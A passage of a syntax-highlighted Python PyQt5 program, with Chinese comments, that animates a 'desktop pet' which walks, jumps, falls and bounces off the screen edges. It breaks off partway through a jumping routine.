class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Attached.CallWeatherWin <span class="keyword">import</span> Mainweather</span><br><span class="line"><span class="keyword">from</span> Attached.crawler <span class="keyword">import</span> Crawler</span><br><span class="line"><span class="keyword">from</span> Attached.Blankbox <span class="keyword">import</span> MainBOX</span><br><span class="line"><span class="keyword">from</span> Attached.Netease <span class="keyword">import</span> Netease</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;配置信息&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>():</span></span><br><span class="line">    ROOT_DIR = os.path.join(os.path.split(os.path.abspath(__file__))[<span class="number">0</span>], <span class="string">&#x27;resources&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ROOT_DIR)</span><br><span class="line">    ACTION_DISTRIBUTION = [</span><br><span class="line">        [<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;10&#x27;</span>], <span class="comment"># 吃撇_0</span></span><br><span class="line">        [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>], <span class="comment"># 眨眼_1</span></span><br><span class="line">        [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span><span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span><span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>], <span class="comment"># 行走_2</span></span><br><span class="line">        [<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;6&#x27;</span>], <span class="comment"># 拖动_3</span></span><br><span class="line">        [<span class="string">&#x27;11&#x27;</span>,<span class="string">&#x27;11a&#x27;</span>,<span class="string">&#x27;11b&#x27;</span>,<span class="string">&#x27;11c&#x27;</span>,<span class="string">&#x27;11d&#x27;</span>,<span class="string">&#x27;11e&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11e&#x27;</span>,<span class="string">&#x27;11d&#x27;</span>,<span class="string">&#x27;11c&#x27;</span>,<span class="string">&#x27;11b&#x27;</span>,<span class="string">&#x27;11a&#x27;</span>,<span class="string">&#x27;11&#x27;</span>], <span class="comment"># 打哈切_4</span></span><br><span class="line">        [<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>, <span class="string">&#x27;14&#x27;</span>], <span class="comment"># 爬_5</span></span><br><span class="line">        [<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>], <span class="comment"># 触地_6</span></span><br><span class="line">        [<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;21&#x27;</span>], <span class="comment"># 睡觉_7</span></span><br><span class="line">        [<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>], <span class="comment"># 跳跃_8</span></span><br><span class="line">        [<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;23a&#x27;</span>,<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;23a&#x27;</span>,<span class="string">&#x27;23b&#x27;</span>,<span class="string">&#x27;24&#x27;</span>,<span class="string">&#x27;25&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;29&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;35&#x27;</span>,<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;37&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;35&#x27;</span>,<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;37&#x27;</span>], <span class="comment"># 举手_9</span></span><br><span class="line">        [<span class="string">&#x27;15&#x27;</span>,<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;17&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;29&#x27;</span>,<span class="string">&#x27;15&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;17&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>], <span class="comment"># 攻击_10</span></span><br><span class="line">        [<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30a&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30a&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;31&#x27;</span>,<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;33&#x27;</span>], <span class="comment"># 打喷嚏_11</span></span><br><span class="line">        [<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>], <span class="comment"># 撞墙_12</span></span><br><span class="line">    ]</span><br><span class="line">    PET_ACTIONS_MAP = &#123;<span class="string">&#x27;pet_1&#x27;</span>: ACTION_DISTRIBUTION&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>): PET_ACTIONS_MAP.update(&#123;<span class="string">&#x27;pet_%s&#x27;</span> % i+<span class="number">1</span>: ACTION_DISTRIBUTION&#125;)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;桌面宠物&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DesktopPet</span>(<span class="params">QWidget</span>):</span></span><br><span class="line">    tool_name = <span class="string">&#x27;桌面宠物&#x27;</span></span><br><span class="line">    stat = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, parent=<span class="literal">None</span>, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(DesktopPet, self).__init__(parent)</span><br><span class="line">        self.cfg = Config()</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> kwargs.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(self.cfg, key): <span class="built_in">setattr</span>(self.cfg, key, value)</span><br><span class="line">        self.setWindowFlags(Qt.FramelessWindowHint|Qt.WindowStaysOnTopHint|Qt.SubWindow)</span><br><span class="line">        self.setAutoFillBackground(<span class="literal">False</span>)</span><br><span class="line">        self.setAttribute(Qt.WA_TranslucentBackground, <span class="literal">True</span>)</span><br><span class="line">        self.repaint()</span><br><span class="line">        self.pet_images, iconpath = self.randomLoadPetImages()</span><br><span class="line">        quit_action = QAction(<span class="string">&#x27;退出&#x27;</span>, self, triggered=self.quitPet)</span><br><span class="line">        quit_action.setIcon(QIcon(iconpath))</span><br><span class="line">        self.tray_icon_menu = QMenu(self)</span><br><span class="line">        self.tray_icon_menu.addAction(quit_action)</span><br><span class="line">        self.tray_icon = QSystemTrayIcon(self)</span><br><span class="line">        self.tray_icon.setIcon(QIcon(iconpath))</span><br><span class="line">        self.tray_icon.setContextMenu(self.tray_icon_menu)</span><br><span class="line">        self.tray_icon.show()</span><br><span class="line">        self.image = QLabel(self)</span><br><span class="line">        self.setImage(self.pet_images[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">        self.is_follow_mouse = <span class="literal">False</span></span><br><span class="line">        self.mouse_drag_pos = self.pos()</span><br><span class="line">        self.resize(<span class="number">236</span>, <span class="number">260</span>)</span><br><span class="line">        self.randomPosition()</span><br><span class="line">        self.is_running_action = <span class="literal">False</span></span><br><span class="line">        self.action_images = []</span><br><span class="line">        self.action_pointer = <span class="number">0</span></span><br><span class="line">        self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.x = self.pos().x()</span><br><span class="line">        self.y = self.pos().y()</span><br><span class="line">        self.heading = <span class="number">0</span></span><br><span class="line">        self.touchdown_key = <span class="number">0</span></span><br><span class="line">        self.jumpping_key = <span class="number">0</span></span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;初始化计时器&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">InitTimer</span>(<span class="params">self,Act,start</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.timer = QTimer()</span><br><span class="line">        self.timer.timeout.connect(Act)</span><br><span class="line">        self.timer.start(start)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机做一个动作&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomAct</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.key = random.randint(<span class="number">0</span>,<span class="built_in">len</span>(DesktopPet.stat)-<span class="number">1</span>)</span><br><span class="line">            self.action = DesktopPet.stat[self.key]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span>+<span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> self.action == <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> self.heading == <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;now is Right&quot;</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.heading == <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;now is Left&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.action == <span class="number">8</span>:</span><br><span class="line">                self.jumpping_key = <span class="number">1</span></span><br><span class="line">                self.InitTimer(self.randomAct,<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.touchdown_key == <span class="number">1</span>:</span><br><span class="line">            self.action_images = self.pet_images[<span class="number">6</span>]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.touchdown()</span><br><span class="line">        <span class="keyword">elif</span> self.jumpping_key == <span class="number">1</span>:</span><br><span class="line">            self.action_images = self.pet_images[<span class="number">8</span>]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.jumpping()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> self.action == <span class="number">2</span>:</span><br><span class="line">                self.moving()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.runFrame()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;完成动作的每一帧&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">runFrame</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            <span class="keyword">if</span> self.action != <span class="number">3</span>:</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.setImage(self.action_images[self.action_pointer].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line">        self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-移动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">moving</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            time.sleep(<span class="number">0.8</span>)</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">            self.x = self.pos().x()</span><br><span class="line">            self.x += <span class="built_in">int</span>(<span class="number">32</span> * (<span class="number">0.5</span> - self.heading))</span><br><span class="line">            <span class="keyword">if</span> (self.heading == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    self.x = self.pos().x()</span><br><span class="line">                    self.x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.heading = <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.pos().y())</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> (self.heading == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    self.x = self.pos().x()</span><br><span class="line">                    self.x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.heading = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.pos().y())</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">1</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-撞墙&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hitwall</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.move(self.x, self.pos().y())</span><br><span class="line">        self.setImage(self.action_images[self.action_pointer].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line">        self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-坠落&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fall</span>(<span class="params">self</span>):</span></span><br><span class="line">        y = self.pos().y()</span><br><span class="line">        x = self.pos().x()</span><br><span class="line">        y += <span class="built_in">int</span>(<span class="number">16</span>)</span><br><span class="line">        screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">        <span class="keyword">if</span> (y &gt;= screenRect.height() - self.size().height()):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;now is kiss the ground&#x27;</span>)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.touchdown_key = <span class="number">1</span></span><br><span class="line">            self.InitTimer(self.randomAct,<span class="number">80</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.move(x,y)</span><br><span class="line">            self.setImage(self.pet_images[<span class="number">6</span>][<span class="number">0</span>].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-触地&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">touchdown</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.x = self.pos().x()</span><br><span class="line">        self.y = self.pos().y()</span><br><span class="line">        self.x -= <span class="number">2</span></span><br><span class="line">        self.y -= <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">            self.touchdown_key = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.move(self.x, self.y)</span><br><span class="line">            self.setImage(self.action_images[self.action_pointer].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line">            self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-吃瘪&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">uncomfortable</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.action = <span class="number">0</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span> + <span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.runFrame()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-拖动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dragging</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.action = <span class="number">3</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span> + <span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.runFrame()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-跳跃&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jumpping</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == <span class="number">0</span>:</span><br><span class="line">            self.z = <span class="number">80</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.fallingBody()</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">            self.jumpping_key = <span class="number">0</span></span><br><span class="line">            self.z = <span class="number">80</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">            self.x = self.pos().x()</span><br><span class="line">            self.y = self.pos().y()</span><br><span class="line">            self.x += <span class="built_in">int</span>(<span class="number">48</span> * (<span class="number">0.5</span> - self.heading))</span><br><span class="line">            self.y -= self.z</span><br><span class="line">            self.z -= <span class="number">5</span></span><br><span class="line">            <span class="keyword">if</span> (self.heading == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    self.x = self.pos().x()</span><br><span class="line">                    self.x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.fallingBody()</span><br><span class="line"> 